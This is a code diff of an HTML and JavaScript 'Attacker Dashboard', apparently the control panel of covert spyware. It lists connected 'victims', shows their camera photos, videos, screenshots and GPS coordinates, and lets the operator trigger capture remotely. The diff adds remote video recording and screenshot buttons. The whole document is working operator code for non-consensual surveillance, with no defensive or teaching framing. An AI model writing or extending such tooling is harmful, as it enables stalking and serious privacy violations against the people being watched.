@@ -50,7 +50,10 @@
         select { background: #1a1f3e; color: white; }
         button { background: #ff4d4d; color: white; font-weight: bold; }
         button.secondary { background: #2a3a5a; }
-        .photo-grid {
+        button.green { background: #00aa44; }
+        button.blue { background: #2266cc; }
+        
+        .photo-grid, .screenshot-grid {
             display: flex;
             flex-wrap: wrap;
             gap: 10px;
@@ -58,42 +61,27 @@
             max-height: 400px;
             overflow-y: auto;
         }
-        .photo-item {
-            position: relative;
+        .photo-item, .screenshot-item {
             width: 150px;
             border: 1px solid #1e2a4a;
             border-radius: 8px;
             overflow: hidden;
             background: #0f1433;
         }
-        .photo-item img {
+        .photo-item img, .screenshot-item img {
             width: 100%;
             aspect-ratio: 1;
             object-fit: cover;
         }
-        .photo-item .badge {
+        .badge {
             position: absolute;
-            top: 5px;
-            left: 5px;
             background: #ff4d4d;
             font-size: 9px;
             padding: 2px 6px;
             border-radius: 4px;
+            margin: 4px;
         }
-        .photo-item .time {
-            font-size: 9px;
-            padding: 4px;
-            text-align: center;
-            color: #6b7c93;
-        }
-        .video-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-top: 15px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
+        .time { font-size: 9px; padding: 4px; text-align: center; color: #6b7c93; }
         .video-item {
             width: 250px;
             border: 1px solid #1e2a4a;
@@ -101,25 +89,7 @@
             overflow: hidden;
             background: #0f1433;
         }
-        .video-item video {
-            width: 100%;
-            aspect-ratio: 16/9;
-        }
-        .screenshot-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 15px;
-        }
-        .screenshot-item {
-            width: 200px;
-            border: 1px solid #ff4d4d;
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        .screenshot-item img {
-            width: 100%;
-        }
+        .video-item video { width: 100%; aspect-ratio: 16/9; }
         .location-card {
             background: #0f1433;
             padding: 15px;
@@ -138,19 +108,17 @@
             cursor: pointer;
             border-radius: 20px;
         }
-        .tab.active {
-            background: #ff4d4d;
-            color: white;
-        }
+        .tab.active { background: #ff4d4d; color: white; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
+        .photo-item { position: relative; }
     </style>
 </head>
 <body>
 
 <div class="header">
     <h1>🔴 Attacker Dashboard</h1>
-    <div class="live">● LIVE SURVEILLANCE</div>
+    <div class="live">● LIVE</div>
 </div>
 
 <div class="stats">
@@ -165,8 +133,10 @@
     <select id="victimSelect">
         <option value="">Select victim to control</option>
     </select>
-    <button id="captureBtn">📸 Capture Photo NOW</button>
-    <button id="clearBtn" class="secondary">🗑️ Clear All</button>
+    <button id="capturePhotoBtn" class="blue">📸 Capture Photo NOW</button>
+    <button id="captureVideoBtn" class="green">🎥 Record Video NOW (5 sec)</button>
+    <button id="captureScreenshotBtn" class="secondary">🖥️ Screenshot NOW</button>
+    <button id="clearBtn">🗑️ Clear All</button>
 </div>
 
 <div class="tab-bar">
@@ -177,11 +147,11 @@
 </div>
 
 <div id="photosTab" class="tab-content active">
-    <div id="photoGrid" class="photo-grid">No photos yet. Click "Capture Photo NOW" or wait for auto-capture</div>
+    <div id="photoGrid" class="photo-grid">No photos yet. Click buttons above or wait for auto-capture</div>
 </div>
 
 <div id="videosTab" class="tab-content">
-    <div id="videoGrid" class="video-grid">No videos yet. Videos record every 15 seconds</div>
+    <div id="videoGrid" class="photo-grid">No videos yet. Click "Record Video NOW"</div>
 </div>
 
 <div id="screenshotsTab" class="tab-content">
@@ -201,80 +171,46 @@
     
     socket.emit('dashboard_join');
     
-    // Photos
     socket.on('new_photo', (data) => {
         photoCount++;
         document.getElementById('photoCount').innerText = photoCount;
-        
         const grid = document.getElementById('photoGrid');
         if (grid.innerHTML.includes('No photos')) grid.innerHTML = '';
-        
         const div = document.createElement('div');
         div.className = 'photo-item';
-        div.innerHTML = `
-            <div class="badge">${data.manual ? 'MANUAL' : 'AUTO'}</div>
-            <img src="${data.imageData}">
-            <div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>
-        `;
+        div.innerHTML = `<div class="badge">${data.manual ? 'MANUAL' : 'AUTO'}</div><img src="${data.imageData}"><div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>`;
         grid.prepend(div);
-        
-        if (data.victimId && !victims.has(data.victimId)) {
-            victims.set(data.victimId, data.victimId);
-            updateVictimSelect();
-        }
+        if (data.victimId && !victims.has(data.victimId)) { victims.set(data.victimId, data.victimId); updateVictimSelect(); }
     });
     
-    // Videos
     socket.on('new_video', (data) => {
         videoCount++;
         document.getElementById('videoCount').innerText = videoCount;
-        
         const grid = document.getElementById('videoGrid');
         if (grid.innerHTML.includes('No videos')) grid.innerHTML = '';
-        
         const div = document.createElement('div');
         div.className = 'video-item';
-        div.innerHTML = `
-            <video controls src="${data.videoData}"></video>
-            <div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>
-        `;
+        div.innerHTML = `<video controls src="${data.videoData}"></video><div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>`;
         grid.prepend(div);
-        
-        while(grid.children.length > 20) grid.removeChild(grid.lastChild);
     });
     
-    // Screenshots
     socket.on('new_screenshot', (data) => {
         screenshotCount++;
         document.getElementById('screenshotCount').innerText = screenshotCount;
-        
         const grid = document.getElementById('screenshotGrid');
         if (grid.innerHTML.includes('No screenshots')) grid.innerHTML = '';
-        
         const div = document.createElement('div');
         div.className = 'screenshot-item';
-        div.innerHTML = `
-            <img src="${data.screenshotData}">
-            <div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>
-        `;
+        div.innerHTML = `<img src="${data.screenshotData}"><div class="time">${new Date(data.timestamp).toLocaleTimeString()}</div>`;
         grid.prepend(div);
     });
     
-    // Location
     socket.on('new_location', (data) => {
         locationCount++;
         document.getElementById('locationCount').innerText = locationCount;
-        document.getElementById('locationDiv').innerHTML = `
-            <div class="location-card">
-                📍 Latitude: ${data.lat}<br>
-                📍 Longitude: ${data.lng}<br>
-                🎯 Accuracy: ±${data.accuracy}m<br>
-                🔗 <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:#4da8ff;">Open in Google Maps</a>
-            </div>
-        `;
+        document.getElementById('locationDiv').innerHTML = `<div class="location-card">📍 ${data.lat}, ${data.lng}<br>🎯 ±${data.accuracy}m<br><a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:#4da8ff;">Open Maps</a></div>`;
     });
     
-    // Victim disconnected
     socket.on('victim_disconnected', (victimId) => {
         victims.delete(victimId);
         updateVictimSelect();
@@ -293,17 +229,21 @@
         document.getElementById('victimCount').innerText = victims.size;
     }
     
-    document.getElementById('victimSelect').onchange = (e) => {
-        currentVictim = e.target.value;
+    document.getElementById('victimSelect').onchange = (e) => { currentVictim = e.target.value; };
+    
+    document.getElementById('capturePhotoBtn').onclick = () => {
+        if (!currentVictim) { alert('Select victim first'); return; }
+        fetch(`/api/capture/photo/${currentVictim}`, { method: 'POST' });
     };
     
-    document.getElementById('captureBtn').onclick = () => {
-        if (!currentVictim) {
-            alert('Select a victim first from the dropdown');
-            return;
-        }
-        fetch(`/api/capture/${currentVictim}`, { method: 'POST' });
-        alert('Photo request sent to victim');
+    document.getElementById('captureVideoBtn').onclick = () => {
+        if (!currentVictim) { alert('Select victim first'); return; }
+        fetch(`/api/capture/video/${currentVictim}`, { method: 'POST' });
+    };
+    
+    document.getElementById('captureScreenshotBtn').onclick = () => {
+        if (!currentVictim) { alert('Select victim first'); return; }
+        fetch(`/api/capture/screenshot/${currentVictim}`, { method: 'POST' });
     };
     
     document.getElementById('clearBtn').onclick = () => {
@@ -316,7 +256,6 @@
         document.getElementById('screenshotCount').innerText = '0';
     };
     
-    // Tab switching
     document.querySelectorAll('.tab').forEach(tab => {
         tab.onclick = () => {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
